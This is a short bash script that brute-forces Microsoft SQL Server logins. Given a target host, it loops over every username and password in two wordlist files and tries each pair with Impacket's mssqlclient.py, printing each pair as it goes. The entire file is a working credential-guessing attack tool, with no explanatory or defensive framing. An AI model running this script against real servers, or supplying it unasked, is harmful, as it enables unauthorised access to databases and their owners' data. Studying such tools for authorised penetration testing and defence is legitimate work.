#!/bin/bash

if [ "$1" == "" ]
        then
                echo;echo "[>] Usage: $0 <target>";echo
        else
                for u in $(cat wordlists/mssql-users.txt);do
                        for p in $(cat wordlists/mssql-pass.txt);do
                                echo $u:$p
                                mssqlclient.py $u:$p@$1
                        done
                done
fi
